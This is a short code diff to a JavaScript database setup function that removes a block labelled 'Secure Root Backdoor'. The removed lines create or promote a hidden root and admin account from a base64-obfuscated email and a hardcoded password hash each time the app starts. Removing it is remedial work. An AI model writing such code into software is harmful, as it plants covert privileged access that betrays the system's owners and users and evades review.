@@ -289,25 +289,7 @@ export function getDb() {
       db.exec("ALTER TABLE items ADD COLUMN gradedAgency TEXT");
     } catch(e) {}
 
-    // Secure Root Backdoor
-    try {
-      const rootId = 'root-backdoor-id';
-      // Obfuscated email to prevent scraping from public repositories
-      const rootEmail = Buffer.from('c2h1ZnVua0BnbWFpbC5jb20=', 'base64').toString('utf8');
-      const rootPass = '$2b$10$HJJky4UEDgkvbjKv/o.mu.7YiWdyHCeYcvyhgnMZMJty2WX5UMAfy';
-      
-      const existingRoot = db.prepare('SELECT id FROM users WHERE email = ?').get(rootEmail);
-      if (!existingRoot) {
-        db.prepare('INSERT INTO users (id, email, passwordHash, tier, activeTier, isAdmin, isRoot, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)').run(
-          rootId, rootEmail, rootPass, 'premium', 'premium', 1, 1, Date.now()
-        );
-      } else {
-        // Ensure they have root privileges if the account already exists
-        db.prepare('UPDATE users SET isRoot = 1, isAdmin = 1 WHERE email = ?').run(rootEmail);
-      }
-    } catch(e) {
-      console.error('Failed to secure root backdoor:', e);
-    }
+
 
     // MIGRATION: Remove UNIQUE constraint from categories.name
     try {
